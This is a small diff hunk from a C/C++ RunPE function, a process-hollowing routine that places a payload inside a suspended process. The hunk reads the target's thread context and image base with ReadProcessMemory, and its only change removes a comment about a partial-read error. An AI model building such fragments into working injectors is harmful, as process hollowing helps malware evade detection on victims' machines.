@@ -80,7 +80,7 @@ void RunPE(LPCWSTR const& target, LPCWSTR const& payload) {
     printf("\nSuccessfully retrieved target thread context");
 
     if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(CTX->Ebx + 8), &base, sizeof(LPVOID), NULL)) { // Assign pointer to suspended process's executable section
-        printf("\nUnable to read target process's thread context. ReadProcessMemory failed with error: %d\n", GetLastError()); // Using ReadProcess and WriteProcessMemory Returning error 299: Only part of a ReadProcessMemory or WriteProcessMemory request was completed.
+        printf("\nUnable to read target process's thread context. ReadProcessMemory failed with error: %d\n", GetLastError()); 
         return;
     }
 
